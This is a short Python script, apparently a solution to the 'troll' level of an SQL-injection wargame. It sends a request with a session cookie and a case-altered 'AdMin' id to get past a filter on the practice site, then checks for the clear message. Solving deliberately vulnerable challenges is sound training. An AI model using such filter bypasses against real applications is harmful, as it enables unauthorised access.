import requests
headers= {'Cookie':'PHPSESSID=iot1jl8tr5l94b3la52t54ps8k'}
url = "https://los.rubiya.kr/chall/troll_05b5eb65d94daf81c42dd44136cb0063.php?id=AdMin"
r = requests.get(url, headers=headers).text
if "<h2>TROLL Clear!</h2>" in r:
    print(r)